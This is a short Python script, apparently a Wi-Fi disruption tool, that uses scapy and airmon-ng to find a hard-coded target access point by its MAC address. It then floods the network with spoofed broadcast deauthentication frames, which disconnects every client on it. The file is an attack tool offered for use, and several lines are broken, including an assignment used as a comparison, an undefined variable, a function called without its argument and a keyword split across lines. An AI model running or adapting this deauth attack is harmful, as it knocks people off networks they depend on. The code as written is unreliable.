from scapy.all import * 
import re
import os 
import threading 
import wireless 




target = '5c:57:1a:b8:26:d0'
armed = 0
ap_list = []
interfaces = []

def get_interface():
   aa = wireless.Wireless() 
   return aa.interfaces() 



def monitor_manage(cmd,wint):
   if iface and cmd == 'start':
      print('Initializing monitor mode [airmon method]')
      os.system('airmon-ng start {0}'.format(wint))
   if iface and cmd == 'stop':
      print('Stopping monitor mode [airmon method]')
      os.system('airmon-ng stop {0}'.format(wint))
   else:
      print('Unknown command or bad interface') 


def packet_process(pkt):
   global ap_list
   if pkt.haslayer(Dot11):
      if pkt.type == 0 and pkt.subtype == 8:
         if pkt.addr2 not in ap_list:
            ap_list.append(pkt.addr2)
            print("AP MAC {0} SSID {1}".format(pkt.addr2,pkt.info))
            

def stop_scan():
   global ap_list
   global target
   global armed 
   if target in ap_list:
      armed = 1
      return True
   else:
      return False 

def load_mon(interfaces):
   mon_interface = '' 
   for line in interfaces:
         if re.search(r'mon[0-9]+',line):
            print('monitor interface identified')
            mon_interface = line
            return mon_interface


def seek_target():
   global armed 
   mons = load_mon() 
   sniff(iface=mons[0], prn=packet_process, stop_filter=stop_scan)
   if armed = 1:
      print("Target {0} has been located")
      return True


class DisruptOperator(threading.Thread):
    def __init__(self,count=20,target=None,moni="mon0"):
        threading.Thread.__init__(self)
        self.target=target
        self.count = count
        self.moni=moni
        self.pkt=scapy.all.RadioTap()/scapy.all.Dot11(addr1="ff:ff:ff:ff:ff:ff",add
r2=target,addr3=target)/scapy.all.Dot11Deauth()

    def run(self):
        print("Starting deauth at {0} packets".format(self.count))
        for item in range(0, self.count):
            scapy.all.sendp(self.pkt, iface=self.moni,count=1, inter=.2, verbose=0)


    
